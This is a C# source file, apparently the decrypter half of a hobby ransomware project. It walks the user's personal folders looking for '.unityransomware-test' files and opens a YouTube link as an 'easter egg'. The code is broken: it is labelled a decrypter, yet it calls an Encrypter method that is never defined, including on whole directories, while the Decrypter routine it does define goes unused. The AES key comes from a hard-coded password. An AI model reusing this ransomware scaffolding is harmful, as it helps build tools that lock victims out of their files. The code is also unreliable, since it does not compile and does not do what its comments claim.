using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static System.Console;

namespace Unitpackage_Encrypter
{
    class Program
    {
        //----------------------------------------------------------------------------------------------------
        private static string MY_COMPUTER = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer);    //Not sure if he can encrypt that
        private static string DESKTOP_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
        private static string DOCUMENTS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        private static string PICTURES_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
        private static string MUSIC_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
        private static string VIDEOS_FOLDER = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
        //----------------------------------------------------------------------------------------------------
        //Made by Mei-chan
        static void Main(string[] args)
        {
            WriteLine("Decrypt the PC");
            //No Lagging Programm
            Thread thread = new Thread(() =>
            {
                decryptStuff(DESKTOP_FOLDER);
                decryptStuff(DOCUMENTS_FOLDER);
                decryptStuff(PICTURES_FOLDER);
                decryptStuff(MUSIC_FOLDER);
                decryptStuff(VIDEOS_FOLDER);
                decryptStuff(MY_COMPUTER);
            });
            thread.Start();


            Process.Start("https://youtu.be/S2AaHfze-H0"); //Nyaaa~ a Easteregg >.<
        }


        private static void decryptStuff(string sDir)
        {
            try
            {
                foreach (string f in Directory.GetFiles(sDir))
                {
                    if (f.Contains(".unityransomware-test"))
                    {
                        Encrypter(f, f, "Mei", 35); //Randomstring make it not tooo high bc ram ;D
                    }

                }

                foreach (string d in Directory.GetDirectories(sDir))
                {
                    Encrypter(d, d, "Mei", 35);
                }
            }
            catch (System.Exception excpt)
            {
                Console.WriteLine(excpt.Message);
            }
        }

        //The Decrypter is Unversal Defined to create a Decrypter for the Random variant of the Ransomware!
        private static void Decrypter(string inputFile, string outputFile, string password, int saltcode) 
        {
            byte[] passwordBytes = System.Text.Encoding.UTF8.GetBytes(password); 
            byte[] salt = new byte[saltcode];
            FileStream cryptfiles = new FileStream(inputFile, FileMode.Open);
            cryptfiles.Read(salt, 0, salt.Length);
            RijndaelManaged ert = new RijndaelManaged();
            ert.KeySize = 256;
            ert.BlockSize = 128;
            var key = new Rfc2898DeriveBytes(passwordBytes, salt, 50000);
            ert.Key = key.GetBytes(ert.KeySize / 8);
            ert.IV = key.GetBytes(ert.BlockSize / 8);
            ert.Padding = PaddingMode.PKCS7;
            ert.Mode = CipherMode.CBC;

            CryptoStream cryptoStream = new CryptoStream(cryptfiles, ert.CreateDecryptor(), CryptoStreamMode.Read);

            FileStream fileStreamOutput = new FileStream(outputFile, FileMode.Create);

            int read;
            byte[] buffer = new byte[1048576];

            try
            {
                while ((read = cryptoStream.Read(buffer, 0, buffer.Length)) > 0)
                {
                    
                    fileStreamOutput.Write(buffer, 0, read);
                }
            }
            catch (CryptographicException ex_CryptographicException)
            {
                Console.WriteLine("CryptographicException error: " + ex_CryptographicException.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error: " + ex.Message);
            }

            try
            {
                cryptoStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error by closing CryptoStream: " + ex.Message);
            }
            finally
            {
                fileStreamOutput.Close();
                cryptfiles.Close();
            }
        }

      
    }
}
